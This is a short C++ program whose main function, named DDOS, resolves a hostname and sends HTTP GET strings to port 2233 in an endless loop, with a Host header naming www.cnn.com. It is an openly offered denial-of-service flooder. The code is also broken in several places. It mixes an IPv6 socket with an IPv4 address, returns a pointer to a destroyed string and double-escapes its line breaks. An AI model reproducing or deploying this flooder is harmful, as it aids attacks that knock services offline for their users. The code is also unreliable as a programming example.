#include <iostream>
#include <netdb.h>
#include <arpa/inet.h>
#include <cstring>
#include <unistd.h>

using namespace std;

const char * getIPadress(int argc, char* argv[]){
    if(argc != 2)
    {
        printf("usage: %s <hostname>\n", argv[0], argv[1]);
        exit(1);
    }

    hostent * record = gethostbyname(argv[1]);
    if(record == NULL)
    {
        printf("%s is unavailable\n", argv[1]);
        exit(1);
    }
    in_addr * address = (in_addr * )record->h_addr;
    string ip_address = inet_ntoa(* address);
    return ip_address.c_str();
}

void DDOS(const char *ip_adress){
    cout << "Ip adress: "<< ip_adress << endl;
    struct sockaddr_in server ;
    struct addrinfo addr; char host_buf[NI_MAXHOST];
    int sd = socket (AF_INET6,SOCK_DGRAM,0);
    if( sd == -1 ) {
        sd = errno;
        printf("Error: %s\n", strerror(sd));
    }
    memset(&server, 0, sizeof( server ));
    server . sin_family = AF_INET;
    server .sin_port = htons(2233);
    if ( inet_aton(ip_adress, &server.sin_addr) <= 0 ) {}
    int con = connect(sd, (const sockaddr *) &server, sizeof(server));
    if( con == -1){
        con = errno;
        printf("Error: %s\n", strerror(con));
    }
    int index = 0;
    for (;;) {
        char buf [] = "GET / HTTP/1.1\\r\\nHost: www.cnn.com\\r\\nConnection: close\\r\\n\\r\\n";
        int se = send(sd, buf, strlen (buf ), 0 );
        if(se == -1){
            se = errno;
            printf("Error: %s\n",strerror(se));
        }
        printf("Index %i\n",index);
        index++;
    }
}
int main(int argc, char *argv[])
{
    DDOS(getIPadress(argc,argv));

    return 0;
}